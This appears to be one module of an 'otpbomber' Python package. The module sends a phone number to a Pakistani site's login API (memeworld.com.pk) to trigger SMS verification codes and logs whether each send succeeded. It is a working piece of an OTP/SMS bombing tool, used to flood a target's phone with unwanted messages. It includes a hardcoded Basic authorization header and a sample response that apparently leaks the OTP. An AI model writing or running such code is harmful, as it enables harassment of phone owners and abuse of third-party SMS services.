from otpbomber.core import *
from otpbomber.localuseragent import *

async def memeworld(phone, client, out):
    name = "memeworld"
    domain = "memeworld"
    frequent_rate_limit=False

    headers = {
    
        'authorization': 'Basic YWRtaW46cGFzc293cmQ=',
    
        'origin': 'https://memeworld.com.pk',
      
        'referer': 'https://memeworld.com.pk/',
  
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    json_data = {
        'msisdn': f"92{phone[-10:]}",
        'device_id': 'random_device_id_from_web',
        'fcm_token': 'random_fcm_token',
    }

    response = await client.post('https://app.memeworld.com.pk/login', headers=headers, json=json_data)
    try:
        data=response.json()
        {'success': True, 'otp': 6894, 'message': 'Verification code sent, Please check your Inbox', 'networkType': 'prepaid'}
        if data["success"] == True and data["message"] == "Verification code sent, Please check your Inbox":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None